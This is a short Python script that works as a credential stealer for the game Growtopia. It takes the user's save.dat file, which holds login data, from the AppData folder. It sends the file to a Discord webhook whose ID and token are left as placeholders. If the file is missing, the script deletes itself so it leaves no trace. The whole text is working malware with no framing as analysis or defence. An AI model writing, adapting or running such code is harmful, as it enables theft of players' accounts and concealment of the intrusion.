import discord, os, getpass
webhook = discord.Webhook.partial(WEBHOOK ID, "WEBHOOK PRIVATE TOKEN", adapter=discord.RequestsWebhookAdapter())
try: webhook.send(file=discord.File("C:\\Users\\"+getpass.getuser()+"\\AppData\\Local\\Growtopia\\save.dat"))
except FileNotFoundError: os.remove(os.path.abspath(__file__))
